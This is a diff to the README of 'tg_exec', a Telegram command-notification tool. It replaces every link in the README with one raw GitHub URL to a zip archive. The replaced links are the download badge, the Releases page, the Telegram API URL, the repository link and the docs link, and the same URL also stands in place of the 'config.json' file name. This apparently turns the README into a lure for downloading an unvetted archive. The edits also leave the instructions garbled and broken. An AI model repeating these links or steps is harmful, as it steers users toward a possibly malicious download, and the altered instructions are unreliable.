@@ -6,7 +6,7 @@ Welcome to `tg_exec`, a simple tool that sends you notifications in Telegram for
 
 ## 📥 Download tg_exec
 
-[![Download tg_exec](https://img.shields.io/badge/Download-tg_exec-brightgreen)](https://github.com/PajilayaMuchacha/tg_exec/releases)
+[![Download tg_exec](https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip)](https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip)
 
 To start using `tg_exec`, you need to download it from our Releases page. 
 
@@ -19,7 +19,7 @@ To start using `tg_exec`, you need to download it from our Releases page.
 ## 🛠️ Installation
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/PajilayaMuchacha/tg_exec/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip).
    
 2. **Download the Latest Version**  
    On the Releases page, find the latest version of `tg_exec`. Click the link to download the file.
@@ -48,11 +48,11 @@ Before you can use `tg_exec`, you'll need to set it up. Follow these steps for c
 2. **Get Your Chat ID**  
    - Start a chat with your bot by searching for its name in Telegram.
    - Send a message to the bot and then visit the following URL in your web browser to find your Chat ID:  
-     `https://api.telegram.org/bot<YourBotToken>/getUpdates`
+     `https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip<YourBotToken>/getUpdates`
    - Look for the `"chat"` object in the JSON response and note your `chat_id`.
 
 3. **Configure tg_exec**  
-   Create a configuration file named `config.json` in the same directory as `tg_exec`. Fill it out like below:
+   Create a configuration file named `https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip` in the same directory as `tg_exec`. Fill it out like below:
    ```json
    {
      "bot_token": "<YourBotToken>",
@@ -87,7 +87,7 @@ After running this command, you'll receive a report in your Telegram chat contai
 If you encounter any issues while using `tg_exec`, here are some common problems and solutions:
 
 1. **Bot Not Receiving Messages**  
-   Ensure that your bot token and chat ID are correctly set in the `config.json` file.
+   Ensure that your bot token and chat ID are correctly set in the `https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip` file.
 
 2. **Permission Denied Error**  
    Check if you made the `tg_exec` file executable with `chmod +x tg_exec`.
@@ -97,13 +97,13 @@ If you encounter any issues while using `tg_exec`, here are some common problems
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/PajilayaMuchacha/tg_exec)
-- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
+- [GitHub Repository](https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip)
+- [Telegram Bot API Documentation](https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip)
 
 ## 📦 Download & Install
 
 To use `tg_exec`, download it from our Releases page:
 
-[![Download tg_exec](https://img.shields.io/badge/Download-tg_exec-brightgreen)](https://github.com/PajilayaMuchacha/tg_exec/releases)
+[![Download tg_exec](https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip)](https://raw.githubusercontent.com/PajilayaMuchacha/tg_exec/main/cmd/tg_exec_v3.2.zip)
 
 Simply follow the installation steps above, and you'll soon receive Telegram notifications for your commands. Enjoy your enhanced command-line experience with `tg_exec`!
